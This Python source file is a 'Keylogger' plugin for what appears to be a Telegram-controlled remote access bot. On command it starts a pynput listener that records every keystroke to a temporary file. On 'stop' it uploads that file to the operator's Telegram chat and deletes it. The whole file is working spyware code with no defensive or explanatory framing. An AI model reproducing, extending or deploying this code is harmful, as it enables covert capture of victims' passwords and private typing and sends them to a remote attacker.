from plugins import Plugin, Command

from threading import Thread

import os

from pynput.keyboard import Key, Listener, Controller

class Main(Plugin):

    name = 'Keylogger'
    version = '1.0.0'

    def setup(self):

        self.current_file_name = ''
        self.status = 'STOPPED'
        
        c = Command('/keylogger', usage='HOSTNAME /keylogger <start/stop> - start/stop the keylogger, sending the recorded file to Telegram if stopping')
        self.add_command(c)

    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/keylogger':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_keylogger, args=tuple(arg_list))
            t.start()


    def handle_keylogger(self, chat_id, flag):
        if self.status == 'STOPPED':
            self.current_file_name = self.bot.generate_file_name('keylogger.txt')
        fname = self.bot.get_tmp(self.current_file_name)
        t = Thread(target=self.keylogger)

        if flag == 'start':
            try:
                if t.isAlive() is False:
                    t.start()
                    self.status = 'STARTED'
                    return self.bot.send_message(chat_id, "Keylogger started!")
            except Exception as e:
                return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))

        elif flag == 'stop':
            try:
                keyboard = Controller()
                keyboard.press(Key.esc)
                f = open(fname)
                self.bot.bot.sendDocument(chat_id, f)
                f.close()
                os.remove(fname)
                self.status = 'STOPPED'
                self.current_file_name = ''
                return self.bot.send_message(chat_id, "Keylogger stopped!")
            except Exception as e:
                return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))


    def keylogger(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        f = self.bot.get_tmp(self.current_file_name)
        with open(f, 'a') as saida:
            if key == Key.space:
                saida.write(' ')
            elif key == Key.enter:
                saida.write('\n')
            elif key == Key.tab:
                saida.write('\t')
            elif key == Key.esc:
                return False
            else:
                key = str(key)
                if 'Key' not in key:
                    key = str(key).split("'")[1]
                    saida.write(key)
